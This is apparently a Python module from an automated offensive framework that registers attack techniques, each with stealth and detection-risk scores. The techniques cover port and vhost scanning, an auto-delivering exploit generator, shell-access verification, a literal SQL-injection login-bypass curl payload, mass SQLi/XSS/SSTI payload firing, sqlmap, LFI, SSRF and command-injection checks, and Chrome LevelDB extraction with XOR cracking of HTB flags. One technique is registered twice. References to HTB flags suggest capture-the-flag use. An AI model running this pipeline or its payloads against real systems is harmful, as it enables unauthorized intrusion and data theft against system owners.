# ---------------------------------------------------------------------------
# Pipeline techniques (Wave 3)
# ---------------------------------------------------------------------------
from __future__ import annotations
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

TECHNIQUE_REGISTRY: Dict[str, "Technique"] = {}


@dataclass
class Technique:
    name: str
    category: str
    prerequisites: List[str] = field(default_factory=list)
    blockers: List[str] = field(default_factory=list)
    outcome: str = ""
    provides: List[str] = field(default_factory=list)
    tool: str = ""
    tool_args_template: str = ""
    timeout: int = 300
    stealth_score: float = 0.5
    required_capabilities: List[str] = field(default_factory=list)
    parser: str = "raw"
    type: str = "recon"
    cost: float = 1.0
    detection_risk: float = 0.1
    provides_affordances: List[str] = field(default_factory=list)


def register(technique: Technique) -> None:
    TECHNIQUE_REGISTRY[technique.name] = technique


def get_technique(name: str) -> Optional[Technique]:
    return TECHNIQUE_REGISTRY.get(name)


def list_techniques() -> List[Technique]:
    return list(TECHNIQUE_REGISTRY.values())


def list_by_category(category: str) -> List[Technique]:
    return [t for t in TECHNIQUE_REGISTRY.values() if t.category == category]


# ---------------------------------------------------------------------------
# Register Wave 1/2 basic recon techniques
# ---------------------------------------------------------------------------
register(Technique(
    name="port_scan",
    category="recon",
    prerequisites=[],
    blockers=["all_ports_filtered"],
    outcome="Full TCP port scan to discover open ports",
    provides=["open_ports", "port_list"],
    tool="nmap",
    tool_args_template="-p- -T3 --min-rate 500 {target}",
    timeout=300,
    stealth_score=0.3,
    required_capabilities=[],
    parser="nmap_port_list",
    type="recon",
    cost=1.0,
    detection_risk=0.3,
    provides_affordances=["open_ports"],
))

register(Technique(
    name="service_scan",
    category="recon",
    prerequisites=["open_ports"],
    blockers=["no_open_ports", "no_detectable_services"],
    outcome="Service version detection on discovered open ports",
    provides=["service_versions", "os_detected"],
    tool="nmap",
    tool_args_template="-sV -O -T3 -p{ports} {target}",
    timeout=300,
    stealth_score=0.4,
    required_capabilities=[],
    parser="nmap_service_version",
    type="recon",
    cost=1.5,
    detection_risk=0.4,
    provides_affordances=["service_versions"],
))

register(Technique(
    name="dns_lookup",
    category="recon",
    prerequisites=[],
    blockers=["no_dns_for_ip_target", "dns_lookup_returned_nothing"],
    outcome="DNS enumeration and record resolution",
    provides=["dns_records_resolved"],
    tool="dig",
    tool_args_template="+noall +answer ANY {target}",
    timeout=10,
    stealth_score=0.8,
    required_capabilities=[],
    parser="dns_raw",
    type="recon",
    cost=0.5,
    detection_risk=0.1,
    provides_affordances=["dns_records_resolved"],
))

# ---------------------------------------------------------------------------
# Register Wave 3 techniques
# ---------------------------------------------------------------------------
register(Technique(
    name="vhost_enum",
    category="recon",
    prerequisites=["http_service"],
    blockers=["waf_blocking", "no_http_response"],
    outcome="Enumerates virtual hosts via DNS brute force, CT logs, Host header fuzzing, SSL SAN parsing, and recursive enumeration",
    provides=["vhosts_discovered", "vhost_count"],
    tool="python3",
    tool_args_template="-m raphael.techniques.vhost_enum {target}",
    timeout=300,
    stealth_score=0.6,
    required_capabilities=["raphael_vhost_enum"],
    parser="vhost_enum",
    type="recon",
    cost=1.5,
    detection_risk=0.3,
    provides_affordances=["vhosts_discovered", "vhost_count"],
))

register(Technique(
    name="exploit_factory",
    category="exploit",
    prerequisites=["vhosts_discovered"],
    blockers=[],
    outcome="Generates exploit payloads from CVE database and templates for discovered vhosts",
    provides=["exploit_payloads", "exploit_deliveries"],
    tool="python3",
    tool_args_template="-m raphael.exploit_factory {target} --auto-deliver --tech-stack '{{\"nginx\":\"1.24\"}}'",
    timeout=600,
    stealth_score=0.4,
    required_capabilities=["raphael_exploit_factory"],
    parser="exploit_factory",
    type="exploit",
    cost=2.0,
    detection_risk=0.5,
    provides_affordances=["exploit_payloads", "exploit_deliveries"],
))

register(Technique(
    name="verification_loop",
    category="exploit",
    prerequisites=["exploit_delivered"],
    blockers=[],
    outcome="Verifies exploit delivery via TCP listener, HTTP canary, and DNS callback channels with fallback chain",
    provides=["exploit_verified", "shell_access", "flag_captured"],
    tool="python3",
    tool_args_template="-m raphael.verifier {target}",
    timeout=300,
    stealth_score=0.5,
    required_capabilities=["raphael_verifier"],
    parser="verification_loop",
    type="exploit",
    cost=1.0,
    detection_risk=0.3,
    provides_affordances=["exploit_verified", "shell_access", "flag_captured"],
))

# ---------------------------------------------------------------------------
# Register HTTP POST capability techniques
# ---------------------------------------------------------------------------
register(Technique(
    name="check_http_methods",
    category="recon",
    prerequisites=["http_service"],
    blockers=["no_http_response"],
    outcome="Checks HTTP methods via OPTIONS to discover POST/PUT/DELETE capability",
    provides=["CAN_HTTP_POST", "http_post_enabled"],
    tool="curl",
    tool_args_template="-s -I -X OPTIONS http://{target}/",
    timeout=15,
    stealth_score=0.8,
    required_capabilities=[],
    parser="http_method_parse",
    type="recon",
    cost=0.3,
    detection_risk=0.1,
    provides_affordances=["CAN_HTTP_POST"],
))

register(Technique(
    name="auth_bypass_post",
    category="exploit",
    prerequisites=["CAN_HTTP_POST", "http_service"],
    blockers=["http_post_disabled", "AUTH_FORBIDDEN"],
    outcome="Attempts SQLi/NoSQLi auth bypass via POST to login endpoints",
    provides=["AUTH_BYPASS_SUCCESS", "SESSION_COOKIE_ISSUED"],
    tool="curl",
    tool_args_template="-s -i -X POST http://{target}/login -H 'Content-Type: application/x-www-form-urlencoded' --data \"username=admin' OR '1'='1&password=admin' OR '1'='1\"",
    timeout=30,
    stealth_score=0.4,
    required_capabilities=[],
    parser="auth_bypass_parse",
    type="exploit",
    cost=1.0,
    detection_risk=0.3,
    provides_affordances=["AUTH_BYPASS_SUCCESS", "SESSION_COOKIE_ISSUED"],
))

# ---------------------------------------------------------------------------
# Register Chrome extension forensics chain techniques
# ---------------------------------------------------------------------------
register(Technique(
    name="js_deobfuscate",
    category="recon",
    prerequisites=["extension_source_available"],
    blockers=["no_js_source"],
    outcome="Deobfuscates Chrome extension JavaScript by stripping hex array encodings",
    provides=["JS_DEOBFUSCATED"],
    tool="python3",
    tool_args_template="-c \"import sys,re; d=sys.stdin.read(); print(re.sub(r'\\[(.*?)\\]', lambda m: str([bytes.fromhex(x.replace('\\\\\\\\x', '')).decode('utf-8','ignore') for x in m.group(1).replace(\\\"'\\\",\\\"\\\").split(',')]) if '\\\\\\\\x' in m.group(1) else m.group(0), d))\"",
    timeout=30,
    stealth_score=0.9,
    required_capabilities=[],
    parser="js_deobfuscate_parse",
    type="recon",
    cost=0.5,
    detection_risk=0.05,
    provides_affordances=["JS_DEOBFUSCATED"],
))

register(Technique(
    name="leveldb_parse",
    category="recon",
    prerequisites=["extension_fs_accessible"],
    blockers=["leveldb_not_found"],
    outcome="Extracts key-value pairs from Chrome extension LevelDB local storage",
    provides=["LEVELDB_RECORDS_EXTRACTED"],
    tool="python3",
    tool_args_template="-c \"import plyvel,sys; db=plyvel.DB(sys.argv[1], create_if_missing=False); print('\\n'.join([f'{k.hex()}:{v.hex()}' for k,v in db if len(v)>50])); db.close()\"",
    timeout=30,
    stealth_score=0.9,
    required_capabilities=["plyvel_installed"],
    parser="leveldb_data_parse",
    type="recon",
    cost=0.5,
    detection_risk=0.05,
    provides_affordances=["LEVELDB_RECORDS_EXTRACTED"],
))

register(Technique(
    name="xor_crack",
    category="exploit",
    prerequisites=["LEVELDB_RECORDS_EXTRACTED"],
    blockers=["xor_sweep_no_flag"],
    outcome="Applies phase-shifted XOR decryption to LevelDB payloads to extract HTB flags",
    provides=["FLAG_DECRYPTED"],
    tool="python3",
    tool_args_template="-m raphael.techniques.ad1_xor_sweep",
    timeout=120,
    stealth_score=0.7,
    required_capabilities=[],
    parser="xor_crack_parse",
    type="exploit",
    cost=2.0,
    detection_risk=0.1,
    provides_affordances=["FLAG_DECRYPTED"],
))

# ---------------------------------------------------------------------------
# Register Blind Probe — zero-knowledge structural perturbation
# ---------------------------------------------------------------------------
register(Technique(
    name="blind_probe",
    category="recon",
    prerequisites=["open_ports"],
    blockers=["no_open_ports", "PORT_MUTE_ON_ALL_VECTORS"],
    outcome="Fires entropy vectors at open sockets before protocol identification. Measures structural response signatures.",
    provides=["SIGNATURE_ACQUIRED", "http_service"],
    tool="python3",
    tool_args_template="-m raphael.techniques.blind_probe {target_ip} {port}",
    timeout=60,
    stealth_score=0.3,  # Noisy by nature — structural anomalies trigger IDS
    required_capabilities=[],
    parser="blind_probe_parse",
    type="recon",
    cost=0.5,
    detection_risk=0.6,  # High — these payloads look like attacks
    provides_affordances=["SIGNATURE_ACQUIRED", "http_service"],
))

register(Technique(
    name="blind_probe",
    category="recon",
    prerequisites=["open_ports"],
    blockers=["no_open_ports", "PORT_MUTE_ON_ALL_VECTORS"],
    outcome="Fires entropy vectors at open sockets before protocol identification. Measures structural response signatures.",
    provides=["SIGNATURE_ACQUIRED", "http_service"],
    tool="python3",
    tool_args_template="-m raphael.scripts.blind_probe_runner {target_ip} {port}",
    timeout=60,
    stealth_score=0.3,
    required_capabilities=[],
    parser="BlindProbeParser",
    type="recon",
    cost=0.5,
    detection_risk=0.6,
    provides_affordances=["SIGNATURE_ACQUIRED", "http_service"],
))

# ---------------------------------------------------------------------------
# Register Hellfire extractions: PayloadFabric mass test + fast port scan
# ---------------------------------------------------------------------------
register(Technique(
    name="mass_payload_test",
    category="recon",
    prerequisites=["http_service"],
    blockers=["no_http_response"],
    outcome="Rapidly fires SQLi/XSS/SSTI/NoSQLi payloads at discovered parameters via PayloadFabric",
    provides=["INJECTION_POINTS_FOUND"],
    tool="python3",
    tool_args_template="-m raphael.techniques.payloads.fabric --type sqli --target http://{target}/",
    timeout=120,
    stealth_score=0.3,
    required_capabilities=[],
    parser="mass_payload_parse",
    type="recon",
    cost=1.0,
    detection_risk=0.5,
    provides_affordances=["INJECTION_POINTS_FOUND"],
))

register(Technique(
    name="fast_port_check",
    category="recon",
    prerequisites=[],
    blockers=["scan_in_progress"],
    outcome="Concurrent TCP port scan — 50-100x faster than nmap sequential scan for common ports",
    provides=["open_ports", "port_list"],
    tool="python3",
    tool_args_template="-m raphael.techniques.fast_port_scan --target {target} --ports {ports}",
    timeout=120,
    stealth_score=0.4,
    required_capabilities=[],
    parser="fast_port_parse",
    type="recon",
    cost=0.5,
    detection_risk=0.4,
    provides_affordances=["open_ports"],
))

# ---------------------------------------------------------------------------
# Register Wave 4a — WAF detect, tech detect, subdomain enum
# ---------------------------------------------------------------------------
register(Technique(
    name="waf_detect",
    category="recon",
    prerequisites=["http_service"],
    blockers=["no_http_response"],
    outcome="WAF fingerprinting via nuclei WAF detection templates",
    provides=["waf_detected"],
    tool="python3",
    tool_args_template="-m raphael.techniques.waf_detect http://{target}/",
    timeout=60,
    stealth_score=0.7,
    required_capabilities=[],
    parser="waf_detect",
    type="recon",
    cost=0.5,
    detection_risk=0.2,
    provides_affordances=["waf_detected"],
))

register(Technique(
    name="tech_detect",
    category="recon",
    prerequisites=["http_service"],
    blockers=["no_http_response", "no_tech_detected"],
    outcome="Technology stack identification via whatweb",
    provides=["tech_stack"],
    tool="python3",
    tool_args_template="-m raphael.techniques.tech_detect http://{target}/",
    timeout=120,
    stealth_score=0.8,
    required_capabilities=[],
    parser="tech_fingerprint",
    type="recon",
    cost=0.5,
    detection_risk=0.15,
    provides_affordances=["tech_stack"],
))

register(Technique(
    name="subdomain_enum",
    category="recon",
    prerequisites=["dns_records_resolved"],
    blockers=["no_dns_for_ip_target"],
    outcome="Subdomain enumeration via gobuster DNS brute force",
    provides=["subdomains"],
    tool="python3",
    tool_args_template="-m raphael.techniques.subdomain_enum {target}",
    timeout=300,
    stealth_score=0.6,
    required_capabilities=[],
    parser="subdomain_list",
    type="recon",
    cost=1.0,
    detection_risk=0.3,
    provides_affordances=["subdomains"],
))

# ---------------------------------------------------------------------------
# Register Wave 4b — Directory brute, SQLi, LFI, SSRF
# ---------------------------------------------------------------------------
register(Technique(
    name="directory_brute",
    category="recon",
    prerequisites=["http_service"],
    blockers=["no_http_response"],
    outcome="Directory/file enumeration via gobuster dir mode",
    provides=["directories_found"],
    tool="python3",
    tool_args_template="-m raphael.techniques.directory_brute http://{target}/",
    timeout=300,
    stealth_score=0.4,
    required_capabilities=[],
    parser="directory_brute",
    type="recon",
    cost=1.0,
    detection_risk=0.3,
    provides_affordances=["directories_found"],
))

register(Technique(
    name="sqli_check",
    category="exploit",
    prerequisites=["http_service"],
    blockers=["no_http_response", "sqli_not_found"],
    outcome="Deep SQL injection detection via sqlmap (complements mass_payload_test)",
    provides=["sqli_vulnerable", "sqli_confirmed", "dbms_identified"],
    tool="python3",
    tool_args_template="-m raphael.techniques.sqli_check http://{target}/",
    timeout=600,
    stealth_score=0.3,
    required_capabilities=[],
    parser="sqlmap_result",
    type="exploit",
    cost=2.0,
    detection_risk=0.6,
    provides_affordances=["sqli_vulnerable", "sqli_confirmed"],
))

register(Technique(
    name="lfi_check",
    category="exploit",
    prerequisites=["http_service"],
    blockers=["no_http_response", "no_vulnerability_found"],
    outcome="Local File Inclusion detection via nuclei LFI templates",
    provides=["lfi_vulnerable"],
    tool="python3",
    tool_args_template="-m raphael.techniques.lfi_check http://{target}/",
    timeout=120,
    stealth_score=0.5,
    required_capabilities=[],
    parser="nuclei_vuln",
    type="exploit",
    cost=1.0,
    detection_risk=0.4,
    provides_affordances=["lfi_vulnerable"],
))

register(Technique(
    name="ssrf_check",
    category="exploit",
    prerequisites=["http_service"],
    blockers=["no_http_response", "no_vulnerability_found"],
    outcome="Server-Side Request Forgery detection via nuclei SSRF templates",
    provides=["ssrf_vulnerable"],
    tool="python3",
    tool_args_template="-m raphael.techniques.ssrf_check http://{target}/",
    timeout=120,
    stealth_score=0.5,
    required_capabilities=[],
    parser="nuclei_vuln",
    type="exploit",
    cost=1.0,
    detection_risk=0.4,
    provides_affordances=["ssrf_vulnerable"],
))

# ---------------------------------------------------------------------------
# Register Wave 4c — CMDi, Open Redirect
# ---------------------------------------------------------------------------
register(Technique(
    name="cmdi_check",
    category="exploit",
    prerequisites=["http_service"],
    blockers=["no_http_response", "no_vulnerability_found"],
    outcome="Command Injection detection via nuclei cmd-injection/rce templates",
    provides=["cmdi_vulnerable"],
    tool="python3",
    tool_args_template="-m raphael.techniques.cmdi_check http://{target}/",
    timeout=120,
    stealth_score=0.5,
    required_capabilities=[],
    parser="nuclei_vuln",
    type="exploit",
    cost=1.0,
    detection_risk=0.4,
    provides_affordances=["cmdi_vulnerable"],
))

register(Technique(
    name="open_redirect",
    category="exploit",
    prerequisites=["http_service"],
    blockers=["no_http_response", "no_vulnerability_found"],
    outcome="Open Redirect detection via nuclei redirect templates",
    provides=["open_redirect_vulnerable"],
    tool="python3",
    tool_args_template="-m raphael.techniques.open_redirect http://{target}/",
    timeout=120,
    stealth_score=0.6,
    required_capabilities=[],
    parser="nuclei_vuln",
    type="exploit",
    cost=0.5,
    detection_risk=0.2,
    provides_affordances=["open_redirect_vulnerable"],
))